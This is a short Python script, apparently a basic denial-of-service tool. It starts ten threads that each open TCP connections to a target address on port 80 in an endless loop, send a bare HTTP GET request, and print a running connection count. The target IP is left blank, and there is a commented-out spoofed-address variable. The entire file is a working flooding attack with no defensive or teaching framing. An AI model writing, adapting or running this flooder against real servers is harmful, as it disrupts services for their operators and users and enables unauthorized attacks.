import threading
import socket

target_ip = ''
port = 80
# fake_ip = '127.0.0.1'

connected = 0

def attack():
  while True:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, port))
    s.send(("GET / HTTP/1.1\r\n").encode('ascii'))
    s.send(("HOST: " + target_ip + " \r\n\r\n").encode('ascii'))
    s.close()

    #add something..
    #just add

    global connected
    connected += 1
    if connected % 500 == 0:
      print(connected)

for i in range(10):
  thread = threading.Thread(target=attack)
  thread.start()